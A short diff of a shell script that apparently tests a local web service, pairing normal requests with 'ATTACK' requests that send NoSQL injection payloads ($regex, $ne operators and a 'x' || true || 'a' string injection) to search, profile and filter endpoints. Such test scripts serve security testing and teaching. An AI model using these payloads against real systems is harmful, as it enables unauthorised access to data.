@@ -10,4 +10,4 @@ echo "--- search ATTACK";     curl -s -g "$B/search?q[\$regex]=.*" | head -c 200
 echo "--- profile normal";    curl -s "$B/profile?username=alice"; echo
 echo "--- profile ATTACK";    curl -s -g "$B/profile?username[\$ne]=x"; echo
 echo "--- filter normal";     curl -s "$B/filter?category=books&maxPrice=500" | head -c 200; echo
-echo "--- filter ATTACK";     curl -s -G --data-urlencode "category=x' || '1'=='1" --data-urlencode "maxPrice=0" $B/filter | head -c 200; echo
+echo "--- filter ATTACK";     curl -s -G --data-urlencode "category=x' || true || 'a" --data-urlencode "maxPrice=0" $B/filter | head -c 200; echo
